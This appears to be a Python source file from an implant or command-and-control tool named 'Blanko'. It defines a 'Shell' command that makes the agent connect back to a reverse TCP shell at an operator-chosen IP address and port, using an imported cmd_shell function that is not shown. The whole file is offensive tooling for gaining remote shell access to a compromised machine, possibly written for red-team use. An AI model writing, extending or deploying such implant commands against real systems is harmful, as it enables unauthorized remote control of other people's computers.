"""Tell Blanko to connect back to a reverse shell"""
from typing import Any, Tuple

from pydantic import Field

from blanko.controller.commands import cmd_shell
from .base import BlankoPlay


class Shell(BlankoPlay):
    """SHELL"""
    name: str = "shell"
    description: str = "Have Blanko connect to a reverse TCP shell"
    return_type: Any = bool

    shell_ip: str = Field(
        required=True,
        description="IP of listening reverse TCP shell",
    )
    shell_port: int = Field(
        required=True,
        description="Port number of listening reverse TCP shell",
    )

    def slam(self) -> bool:
        return cmd_shell(
            dest_ip=self.dest_ip,
            dest_port=self.dest_port,
            listen_port=self.listen_port,
            shell_ip=self.shell_ip,
            shell_port=self.shell_port,
        )
